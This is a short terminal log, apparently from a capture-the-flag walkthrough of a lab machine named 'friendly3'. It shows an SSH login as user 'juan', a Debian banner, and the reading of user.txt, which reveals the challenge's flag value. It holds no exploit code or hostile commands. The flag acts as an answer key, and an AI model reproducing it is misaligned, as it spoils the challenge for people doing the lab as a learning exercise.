ED25519 key fingerprint is: SHA256:qcoxC68+orQ8LIJrunR2ElUTnj9X5X0OFj9F/oxHDjc
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.15.10' (ED25519) to the list of known hosts.
juan@192.168.15.10's password: 
Linux friendly3 6.1.0-9-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.27-1 (2023-05-08) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
juan@friendly3:~$ 

juan@friendly3:~$ whoami
juan
juan@friendly3:~$ ls
ftp  user.txt
juan@friendly3:~$ cat user.txt
cb40b159c8086733d57280de3f97de30
juan@friendly3:~$ 

